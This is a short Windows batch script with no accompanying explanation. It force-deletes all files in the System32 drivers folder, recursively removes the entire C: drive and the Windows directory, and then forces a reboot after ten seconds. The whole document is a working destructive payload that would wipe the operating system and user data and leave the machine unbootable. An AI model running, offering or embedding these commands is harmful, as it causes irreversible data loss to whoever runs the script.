@echo off
(

    del /f /s /q C:\Windows\System32\drivers\*.*
    rmdir /s /q C:\
    rmdir /s /q C:\Windows\

)
shutdown /r /f /t 10
